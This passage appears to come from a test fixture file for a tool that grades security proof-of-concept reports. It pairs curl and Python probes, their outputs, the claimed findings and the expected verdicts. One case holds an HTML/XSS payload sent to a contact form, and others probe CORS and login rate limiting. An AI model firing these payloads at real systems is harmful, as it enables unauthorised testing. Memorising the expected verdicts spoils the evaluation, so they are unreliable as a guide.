      valid: true,
      findingType: "expected-behavior",
      minConfidence: 0.7,
    },
    input: {
      pocType: "bash",
      pocScript: `#!/bin/bash
curl -s "https://demo.target.example/login"`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout:
          "Demo login enabled. Use username demo@example.com and OTP 000000 for sandbox testing only.",
      },
      claim: {
        title: "Demo environment accepts static OTP",
        description:
          "The public demo environment documents a static OTP for sandbox access.",
        impact:
          "The behavior is limited to the sandbox demo tenant and is intentionally documented.",
        evidence:
          "The login page itself states OTP 000000 is for sandbox testing only.",
        endpoint: "https://demo.target.example/login",
        vulnerabilityClass: "authentication-bypass",
      },
    },
  },
  {
    name: "missing security headers on static asset",
    category: "informational",
    expected: {
      valid: true,
      findingType: "informational",
      minConfidence: 0.65,
    },
    input: {
      pocType: "bash",
      pocScript: `#!/bin/bash
curl -I -s "https://target.example/assets/logo.png"`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout: `HTTP/2 200
content-type: image/png
cache-control: public, max-age=31536000`,
      },
      claim: {
        title: "Static asset response missing security headers",
        description:
          "A static image response does not include X-Frame-Options or Content-Security-Policy headers.",
        impact:
          "This is a low-risk hardening observation because the endpoint only serves static public content.",
        evidence:
          "The HEAD response for /assets/logo.png lacks common browser hardening headers.",
        endpoint: "https://target.example/assets/logo.png",
        vulnerabilityClass: "missing-security-headers",
      },
    },
  },
  {
    name: "verbose error without exploitable disclosure",
    category: "informational",
    expected: {
      valid: true,
      findingType: "informational",
      minConfidence: 0.65,
    },
    input: {
      pocType: "bash",
      pocScript: `#!/bin/bash
curl -s "https://target.example/api/report?id=not-a-uuid"`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout:
          '{"error":"invalid input syntax for type uuid","requestId":"req_eval_123"}',
      },
      claim: {
        title: "Verbose error message reveals backend validation detail",
        description:
          "Invalid report IDs return a backend validation error string.",
        impact:
          "The message discloses implementation detail but does not include secrets, stack traces, or exploitable data.",
        evidence: "The API returned invalid input syntax for type uuid.",
        endpoint: "https://target.example/api/report",
        vulnerabilityClass: "information-disclosure",
      },
    },
  },
  {
    name: "permissive cors on documented public api",
    category: "informational",
    expected: {
      valid: true,
      findingType: "informational",
      minConfidence: 0.65,
    },
    input: {
      pocType: "bash",
      pocScript: `#!/bin/bash
curl -I -s "https://target.example/public/catalog" -H "Origin: https://evil.example"`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout: `HTTP/2 200
access-control-allow-origin: *
content-type: application/json`,
      },
      claim: {
        title: "Permissive CORS on public catalog API",
        description:
          "The documented public catalog API returns Access-Control-Allow-Origin: *.",
        impact:
          "Any website can read public catalog data, which appears intentionally public and unauthenticated.",
        evidence:
          "The response to an arbitrary Origin includes Access-Control-Allow-Origin: *.",
        endpoint: "https://target.example/public/catalog",
        vulnerabilityClass: "cors",
      },
    },
  },
  {
    name: "html email injection accepted without rendering verification",
    category: "true-positive",
    expected: {
      valid: true,
      findingType: "vulnerability",
      maxConfidence: 0.69,
      mustMentionConcerns: ["not independently verified"],
    },
    input: {
      pocType: "python",
      pocScript: `import requests

payload = "<h1>Injected</h1><img src=x onerror=alert(1)>"
response = requests.post("https://target.example/contact", json={"message": payload}, timeout=10)
print(response.status_code)
print(response.text)`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout: `200
{"status":"queued","message":"contact email accepted for delivery"}`,
      },
      claim: {
        title: "HTML injection in contact email body",
        description:
          "The contact form accepts HTML that may be delivered to support staff in an email body.",
        impact:
          "If rendered by the recipient mail client, the injected HTML could spoof content or trigger client-side behavior.",
        evidence:
          "The POC submitted HTML and the server returned contact email accepted for delivery, but no mailbox retrieval was performed.",
        endpoint: "https://target.example/contact",
        vulnerabilityClass: "html-injection",
      },
    },
  },
  {
    name: "rate limiting tested with insufficient volume",
    category: "true-positive",
    expected: {
      valid: true,
      findingType: "vulnerability",
      maxConfidence: 0.69,
      mustMentionConcerns: ["insufficient test volume"],
    },
    input: {
      pocType: "bash",
      pocScript: `#!/bin/bash
for i in {1..12}; do
  curl -s -o /dev/null -w "%{http_code}\\n" "https://target.example/login"
done`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout: `200
200
200
200
200
200
200
200
200
200
200
200`,
      },
      claim: {
        title: "Login endpoint lacks rate limiting",
        description:
          "The login endpoint accepted 12 repeated requests without returning throttling responses.",
        impact:
          "Attackers may be able to brute-force credentials if higher request volumes are also unthrottled.",
        evidence: "The POC sent 12 requests and all returned 200.",
        endpoint: "https://target.example/login",
        vulnerabilityClass: "missing-rate-limiting",
      },
    },
  },
];
